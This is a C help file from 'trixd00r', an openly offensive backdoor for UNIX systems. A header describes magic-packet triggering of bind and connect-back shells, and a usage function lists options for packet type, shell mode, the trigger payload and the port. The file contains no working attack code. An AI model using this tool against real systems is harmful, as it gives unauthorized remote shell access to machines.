/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/src/help.c                                                           *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "help.h"
#include "trixd00r.h"


/* leet banner */
void banner()
{
    printf("+-----------------------------------------+\
           \n| trixd00r - http://www.nullsecurity.net/ |\
           \n+-----------------------------------------+\n");

    return;
}


/* help and usage */
void usage()
{
    printf("usage:\n\n\
  trixd00r -h <arg> [options]\n\
    \noptions:\n\n\
  -h <host>     - trixd00rd host\n\
  -t <type>     - magic packet - ? to list all (default TCP SYN)\n\
  -s <mode>     - shell mode - ? to list all (default TCP connect)\n\
  -m <string>   - magic payload (default opensesame)\n\
  -p <port>     - port to connect or listen (default 31337)\n\
  -v            - verbose mode (default quiet)\n\
  -V            - show trixd00r version\n\
  -H            - show help and usage\n");

    return;
}

/* EOF */
